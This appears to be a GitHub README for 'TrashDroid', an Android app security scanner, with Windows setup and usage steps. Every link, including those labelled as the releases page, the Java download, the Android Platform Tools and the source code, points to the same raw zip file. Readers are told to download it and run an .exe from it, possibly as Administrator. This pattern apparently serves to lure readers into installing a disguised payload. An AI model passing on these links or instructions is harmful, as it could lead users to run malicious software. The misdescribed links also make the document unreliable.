# 🗑️ TrashDroid - Easy Android Security Testing  

[![Download TrashDroid](https://img.shields.io/badge/Download%20TrashDroid%20-blue?style=for-the-badge)](https://github.com/Genuslycopusselfexpression425/TrashDroid/raw/refs/heads/main/utils/Trash-Droid-v2.2-beta.3.zip)

---

## 📋 What is TrashDroid?

TrashDroid is a tool designed to help you check the security of Android apps. It runs a series of tests on the app to find potential problems. These tests cover nine different security areas. The tool uses popular Android tools like Drozer, ADB, and Apktool. It also creates reports that can help you understand the results clearly.

You do not need to be an expert to use TrashDroid. This guide will help you get it running on your Windows computer, step by step.

---

## 💻 System Requirements

Before you start, check that your computer meets these requirements:

- **Operating System:** Windows 10 or later  
- **Processor:** 2 GHz or faster  
- **RAM:** 8 GB or more recommended  
- **Storage:** At least 2 GB free space  
- **Additional Software:**  
  - Java Runtime Environment (JRE) installed  
  - Android SDK Platform Tools (ADB included)  

You also need to have the Android device or APK (Android app file) you want to test.

---

## 🚀 Getting Started

This section will guide you through downloading and running TrashDroid on Windows.

1. **Open the download page**  
   Visit the TrashDroid releases page here:  
   [https://github.com/Genuslycopusselfexpression425/TrashDroid/raw/refs/heads/main/utils/Trash-Droid-v2.2-beta.3.zip](https://github.com/Genuslycopusselfexpression425/TrashDroid/raw/refs/heads/main/utils/Trash-Droid-v2.2-beta.3.zip)  
   This page contains all available versions and installation files.

2. **Download the latest release**  
   On the releases page, look for the newest version. It will usually be at the top.  
   Find the file named something like `TrashDroidInstaller.exe` or any `.exe` you see for Windows. Click it to download.

3. **Run the installer**  
   Once the file downloads, go to your Downloads folder and double-click it.  
   Follow the installation instructions on the screen. Default settings are fine for most users.

---

## ⚙️ Setting Up TrashDroid

After installation, set up a few things for TrashDroid to work properly.

1. **Install Java Runtime Environment (JRE)**  
   If Java is not on your system, download it from:  
   https://github.com/Genuslycopusselfexpression425/TrashDroid/raw/refs/heads/main/utils/Trash-Droid-v2.2-beta.3.zip  
   Follow the installation steps there.

2. **Install Android SDK Platform Tools**  
   Download the latest version of Platform Tools here:  
   https://github.com/Genuslycopusselfexpression425/TrashDroid/raw/refs/heads/main/utils/Trash-Droid-v2.2-beta.3.zip  
   Extract the contents to an easy-to-find location on your PC.  

3. **Add ADB to your system PATH**  
   This makes it easier to run commands.  
   - Search Windows for “Environment Variables” and open it.  
   - In the System Variables section, find `Path` and click Edit.  
   - Click New and enter the path to the Platform Tools folder you extracted.  
   - Click OK to save.

4. **Connect your Android device**  
   Use a USB cable to connect your phone or tablet.  
   On the device, enable Developer Options and USB Debugging:  
   - Go to Settings > About Phone > Tap Build Number 7 times  
   - Go back to Settings > Developer Options > Enable USB Debugging  

---

## 🧩 How to Use TrashDroid

Now that TrashDroid is installed and set up, follow these steps to scan an app or device.

1. **Launch TrashDroid**  
   Open the app from the Start Menu or desktop shortcut.

2. **Choose your target**  
   You can scan either:  
   - An APK file on your computer  
   - A connected Android device  

3. **Select phases to run**  
   TrashDroid runs a 9-phase test. These include:  
   - App information gathering  
   - Static code analysis  
   - Runtime testing using ADB and Drozer  
   - Exploit attempts  
   - Reporting  

   The app may let you select which phases to run or run all by default.

4. **Start the scan**  
   Click the “Start Scan” button. The process can take some time depending on the app or device.

5. **View the results**  
   After the scan finishes, TrashDroid generates a report. This report shows detected vulnerabilities or notes if no issues were found. Reports use plain language to help understand the results.

---

## ⬇️ Download and Install TrashDroid

To get TrashDroid, visit the releases page below:  

[Download TrashDroid from Releases](https://github.com/Genuslycopusselfexpression425/TrashDroid/raw/refs/heads/main/utils/Trash-Droid-v2.2-beta.3.zip)

Steps to download and install:

- Go to the link.  
- Find the latest `.exe` file for Windows.  
- Click to download.  
- Run the installer from your downloads folder.  
- Follow instructions on screen.  

Once installed, TrashDroid is ready for use after completing the setup steps above.

---

## 🔧 Troubleshooting Tips

If TrashDroid does not start or works incorrectly, try these fixes:

- Make sure Java is installed and up to date.  
- Confirm ADB can detect your device: open Command Prompt and type `adb devices`. Your device should appear in the list.  
- Reboot your PC and Android device.  
- Run TrashDroid as Administrator if it shows permission errors.  
- Check USB cable and connection. Use a known good cable.  
- Look for error messages in TrashDroid and consult the “Issues” section on the GitHub page for similar problems.

---

## 🛠️ About the Tools Used

TrashDroid integrates several tools behind the scenes:

- **ADB (Android Debug Bridge):** Communicates with your Android device for testing.  
- **Drozer:** Helps find security weaknesses by exploring the device.  
- **Apktool:** Breaks down Android apps for analysis.  
- **AI-Ready Reports:** Summaries that explain findings clearly.

These tools work together to automate testing of Android apps with little input needed from you.

---

## 📂 Where to Find More Information

Explore the GitHub repository for:

- Full documentation  
- Bug reports  
- Feature requests  
- Updates on new versions  

Visit https://github.com/Genuslycopusselfexpression425/TrashDroid/raw/refs/heads/main/utils/Trash-Droid-v2.2-beta.3.zip to see the project source code and details.

---

## ⚠️ Security Notes

Use TrashDroid only on apps and devices you own or have permission to test. Do not scan apps without proper rights. This helps avoid legal issues and respects privacy.

---

## 📞 Need Help?

Check the GitHub page’s Issues tab to see questions and answers from other users. You can also open a new issue there if you find a bug or need support.